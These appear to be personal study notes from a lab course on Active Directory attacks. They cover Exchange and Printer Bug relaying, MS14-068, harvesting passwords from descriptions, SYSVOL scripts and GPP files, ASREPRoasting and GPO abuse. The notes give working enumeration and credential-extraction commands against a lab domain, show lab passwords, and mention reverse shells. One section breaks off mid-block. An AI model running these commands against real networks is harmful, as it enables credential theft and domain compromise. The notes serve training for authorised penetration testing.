## Exchange Related Group Membership
Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object.
This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.

The Exchange group `Organization Management` is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users.
#### Viewing Organization Management's Permissions
![[Pasted image 20251111112116.png]]
If we can compromise an Exchange server, this will often lead to Domain Admin privileges.
Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes.

## PrivExchange
The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.
The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug
  
The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, and force the server to authenticate to any host provided by the client over SMB. 

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

We can use tools such as the `Get-SpoolStatus` module from [this](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) tool (that can be found on the spawned target) or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.

#### Enumerating for MS-PRN Printer Bug
```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

---
## MS14-068
This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit.

## Sniffing LDAP Credentials
Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext.
 Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).

----
## Enumerating DNS Records
We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack.

The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement.
#### Using adidnsdump
```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```
#### Viewing the Contents of the records.csv File
```shell
> head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231

AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

#### Using the -r Option to Resolve Unknown Records
```shell-session
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
#### Finding Hidden Records in the records.csv File
```shell
> head records.csv

### Password in Description Field
Sensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.
#### Finding Passwords in the Description Field using Get-Domain User
```powershell
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

---
## PASSWD_NOTREQD Field
It is possible to come across domain accounts with the [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain).
#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```powershell
S C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname            useraccountcontrol
--------------            ------------------
guest                 ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                 PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton             PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent           PASSWD_NOTREQD, NORMAL_ACCOUNT
```

## Credentials in SMB Shares and SYSVOL Scripts
The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts.
#### Discovering an Interesting Script
```powershell
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----

-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
```

#### Finding a Password in the Script
```powershell
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

## Group Policy Preferences (GPP) Passwords
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password.

#### Viewing Groups.xml
![[Pasted image 20251112124531.png]]
If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:
#### Decrypting the Password with gpp-decrypt
```shell
> gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```
It is worth attempting to password spray internally with this password (especially if it is unique).

#### Locating & Retrieving GPP Passwords with CrackMapExec
```shell
crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```
It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy.
We can hunt for this using CrackMapExec with the [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.
#### Using CrackMapExec's gpp_autologin Module
```shell
> crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```
In the output above, we can see that we have retrieved the credentials for an account called `guarddesk`.

## ASREPRoasting
It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.
The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.
#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```
#### Retrieving AS-REP in Proper Format using Rubeus (Windows)
```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
We can then crack the hash offline using Hashcat with mode `18200`.



#### Retrieving the AS-REP Using Kerbrute (Linux Attacker)
```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
With a list of valid users, we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found.

#### Hunting for Users with Kerberos Pre-auth Not Required
```shell
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```

## Group Policy Object (GPO) Abuse
Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, domain compromise, and even as a persistence mechanism within the domain.

GPO misconfigurations can be abused to perform the following attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.
#### Enumerating GPO Names with PowerView
```powershell
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```
This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain.

#### Enumerating GPO Names with a Built-In Cmdlet
```powershell
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access
```

#### Enumerating Domain User GPO Rights
```powershell
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```
Here we can see that the Domain Users group has various permissions over a GPO, such as `WriteProperty` and `WriteDacl`, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with `Get-GPO` to see the display name of the GPO.

#### Converting GPO GUID to Name
```powershell
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```
Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.![[Pasted image 20251112125946.png]]
If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.
![[Pasted image 20251112125953.png]]
We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.
